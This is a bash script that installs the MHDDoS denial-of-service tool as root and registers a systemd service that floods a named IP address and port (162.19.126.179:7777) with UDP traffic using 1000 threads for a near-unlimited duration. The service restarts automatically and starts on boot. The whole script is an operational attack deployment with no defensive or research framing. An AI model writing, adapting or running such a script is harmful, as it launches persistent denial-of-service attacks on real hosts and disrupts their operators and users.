# 1. System Cleanup & Dependency Install
sudo apt update && sudo apt install python3 python3-pip git -y
cd /root
rm -rf MHDDoS

# 2. Clone and Install (Forcing Global Packages)
git clone https://github.com/MatrixTM/MHDDoS.git
cd MHDDoS
pip3 install --upgrade pip --break-system-packages
pip3 install -r requirements.txt --break-system-packages
pip3 install PyRoxy --break-system-packages

# 3. Create the "Bulletproof" Service File
# Target: 162.19.126.179:7777 | Threads: 1000
cat <<EOF | sudo tee /etc/systemd/system/mhddos.service
[Unit]
Description=MHDDoS Service
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
User=root
WorkingDirectory=/root/MHDDoS
# Forcing the PYTHONPATH ensures PyRoxy is always found
Environment=PYTHONPATH=/usr/local/lib/python3.12/dist-packages
ExecStart=/usr/bin/python3 start.py UDP 162.19.126.179:7777 1000 99999999999
Restart=always
RestartSec=5s
RuntimeMaxSec=10min
StartLimitBurst=0

[Install]
WantedBy=multi-user.target
EOF

# 4. Activation
sudo systemctl daemon-reload
sudo systemctl enable mhddos.service
sudo systemctl restart mhddos.service

echo "------------------------------------------------"
echo "FRESH INSTALL COMPLETE"
echo "Target: 162.19.126.179:7777"
echo "------------------------------------------------"
sleep 2
systemctl status mhddos.service
